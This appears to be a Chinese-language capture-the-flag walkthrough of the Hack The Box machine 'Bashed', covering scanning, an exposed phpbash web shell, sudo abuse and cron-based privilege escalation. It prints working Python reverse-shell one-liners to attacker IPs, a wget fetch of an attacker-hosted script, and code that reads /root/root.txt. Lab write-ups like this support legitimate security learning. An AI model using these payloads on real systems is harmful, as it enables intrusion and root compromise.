# Bashed

## 信息收集

nmap 收集一下信息：

```
sudo nmap -sV 10.10.10.68
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-24 04:12 CDT
Nmap scan report for 10.10.10.68
Host is up (0.43s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.33 seconds
```

看起来也是一个突破口在网页的目标。

![image](../../%E5%9B%BE%E5%BA%8A/Firefox_Screenshot_2022-08-24T09-18-44.264Z.png)

看着东西很多，实际上页面能访问的只有index.html、single.html。

先dirsearch扫一下目录，结果如下：

```
Target: http://10.10.10.68/

[04:21:37] Starting:                                                   
[04:21:42] 301 -  308B  - /php  ->  http://10.10.10.68/php/
[04:21:43] 301 -  307B  - /js  ->  http://10.10.10.68/js/
[04:21:52] 403 -  297B  - /.ht_wsr.txt
[04:21:52] 403 -  300B  - /.htaccess.bak1
[04:21:52] 403 -  300B  - /.htaccess.orig
[04:21:52] 403 -  302B  - /.htaccess.sample
[04:21:52] 403 -  300B  - /.htaccess.save
[04:21:52] 403 -  300B  - /.htaccess_orig
[04:21:52] 403 -  301B  - /.htaccess_extra
[04:21:52] 403 -  298B  - /.htaccess_sc
[04:21:52] 403 -  298B  - /.htaccessBAK
[04:21:52] 403 -  299B  - /.htaccessOLD2
[04:21:52] 403 -  290B  - /.htm
[04:21:52] 403 -  298B  - /.htaccessOLD
[04:21:52] 403 -  291B  - /.html
[04:21:52] 403 -  296B  - /.htpasswds
[04:21:52] 403 -  300B  - /.htpasswd_test
[04:21:52] 403 -  297B  - /.httr-oauth
[04:21:56] 403 -  290B  - /.php
[04:21:56] 403 -  291B  - /.php3
[04:22:08] 200 -    8KB - /about.html
[04:22:44] 200 -    0B  - /config.php
[04:22:46] 200 -    8KB - /contact.html
[04:22:48] 301 -  308B  - /css  ->  http://10.10.10.68/css/
[04:22:51] 301 -  308B  - /dev  ->  http://10.10.10.68/dev/
[04:22:51] 200 -    1KB - /dev/
[04:22:59] 301 -  310B  - /fonts  ->  http://10.10.10.68/fonts/
[04:23:04] 301 -  311B  - /images  ->  http://10.10.10.68/images/
[04:23:04] 200 -    2KB - /images/
[04:23:08] 200 -    3KB - /js/
[04:23:25] 200 -  939B  - /php/
[04:23:39] 403 -  299B  - /server-status
[04:23:39] 403 -  300B  - /server-status/
[04:23:54] 301 -  312B  - /uploads  ->  http://10.10.10.68/uploads/
[04:23:54] 200 -   14B  - /uploads/
```

不过返回来看页面上这篇文章，有一些关键信息：

![image](../../%E5%9B%BE%E5%BA%8A/Firefox_Screenshot_2022-08-24T09-29-53.097Z.png)

再结合靶机的名字，不难猜测这里就是突破口。根据地址去github找[源码](https://github.com/Arrexel/phpbash)，大概意思就是这个项目可以传一个可视化的shell上去。

回到目录扫描记录，挨个访问状态200的目录，一般来说可以先挑存储体积比较大的或者目录名字比较敏感的看。

这里访问到/dev/的时候，发现路径下已经部署了phpbash.php，那肯定毫不客气先进shell看看。

![image](../../%E5%9B%BE%E5%BA%8A/Firefox_Screenshot_2022-08-24T09-50-14.874Z.png)

## 漏洞利用

这个shell是个比较低的权限，通过这个shell可以直接拿到user.txt。

```
www-data@bashed:/var/www/html/dev# whoami
www-data
```

然后做一下提权，就能拿到root.txt。首先尝试在web端提取：

```
www-data@bashed:/home/arrexel# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/home/arrexel# sudo -u scriptmanager /bin/bash

bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
scriptmanager@bashed:/home/arrexel$ exit
```

这里不能直接用web端shell做提权，需要反弹shell到本地。

本地用 `sudo nc -nvlp 1111` 开监听。

web端输入以下命令，注意修改IP和端口。

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

本地拿到shell，尝试提取，提取命令和上面的一样，以scriptmanager来执行命令。

```
$ sudo nc -nvlp 1111             
listening on [any] 1111 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.68] 43926
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ sudo -l 
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ sudo -u scriptmanager /bin/bash
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
scriptmanager@bashed:/$ 
```

但是scriptmanager是不能访问root的，也就是说得想其它的办法拿到/root/root.txt。

通过查看目录（好像也没有更简便的方法），可以看到scriptmanager能够访问script目录。

```
scriptmanager@bashed:/$ cd scripts
cd scripts
scriptmanager@bashed:/scripts$ ls
ls
test.py
test.txt
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ 
```
这里的test.py其实给出了提示，提示可以通过执行py文件的方式，打开root/root.txt拿回内容。

[这里](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html) 大佬的WP有进一步挖掘细节，test.py是定时自动执行的。所以还是要在这个scripts文件夹下增加文件或修改test.py。

（不过这个服务器没有装vim，可以远程拿本地的）

本地起服务：
```
sudo python3 -m http.server 80
```
起服务的文件夹下新建一个py文件：
```
k = open("/root/root.txt", "r")
f = open("test.txt", "w")
f.write(k.read())
f.close
```
然后shell拿取py文件等待定时执行，查看结果。
```
wget 10.10.16.2/new.py
```

这里其实还有另一种解法，也放在这里，就是使用script定时的功能写py给自己反弹一个root shell。
```
scriptmanager@bashed:/scripts$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```